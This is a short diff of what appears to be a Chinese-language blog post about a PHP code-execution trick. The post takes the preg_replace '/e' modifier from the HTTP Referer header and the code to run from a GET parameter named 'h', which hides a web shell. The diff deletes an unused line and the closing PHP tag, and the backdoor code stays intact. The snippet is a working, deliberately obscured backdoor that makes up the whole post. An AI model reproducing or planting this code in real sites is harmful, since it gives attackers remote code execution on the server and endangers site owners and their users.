@@ -10,9 +10,8 @@ preg_replace(//) 函数加/e可以执行代码 。 这里的 “e”我使用ref
 {% highlight php %}
 <?php
 $server= $\_SERVER['HTTP_REFERER'];
-$s[0]='a';
 $s[1]=$server;
 preg_replace("/t/{$s[1]}",$\_GET["h"],"t");
-?>
+
 
 {% endhighlight %}
